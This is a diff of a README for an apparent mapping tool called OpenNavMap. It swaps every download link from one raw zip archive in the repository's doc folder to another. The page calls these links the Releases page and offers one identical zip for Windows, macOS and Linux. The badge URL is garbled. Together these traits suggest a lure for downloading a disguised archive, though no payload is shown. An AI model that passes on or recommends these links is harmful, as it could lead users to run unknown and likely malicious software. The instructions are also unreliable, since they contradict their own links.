@@ -1,6 +1,6 @@
 # 🌍 OpenNavMap - Effortless Mapping for Everyone
 
-[![Download OpenNavMap](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip%20OpenNavMap-%https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip)](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip)
+[![Download OpenNavMap](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip%20OpenNavMap-%https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip)](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,15 +11,15 @@ Welcome to OpenNavMap! This software helps you create accurate maps without need
 To get started, you need to visit the Releases page. Follow these steps:
 
 1. Click on the link below:
-   [Visit this page to download](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip).
+   [Visit this page to download](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip).
    
 2. On the Releases page, you will find the latest version of OpenNavMap. 
 
 3. Look for the download link for your operating system. Depending on your system, you may see files such as:
 
-   - Windows: `https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip`
-   - macOS: `https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip`
-   - Linux: `https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip`
+   - Windows: `https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip`
+   - macOS: `https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip`
+   - Linux: `https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip`
 
 4. Click on the file to begin the download. 
 
@@ -73,6 +73,6 @@ If you need help or have questions about OpenNavMap, reach out via our GitHub Is
 ## 🎉 Updates
 
 To keep up with the latest features and fixes, regularly check the Releases page:
-[Visit this page to download](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/media/Nav_Open_Map_1.7-beta.3.zip).
+[Visit this page to download](https://github.com/ALi2021-debug/OpenNavMap/raw/refs/heads/main/doc/Map_Open_Nav_1.7.zip).
 
 Enjoy mapping with OpenNavMap!
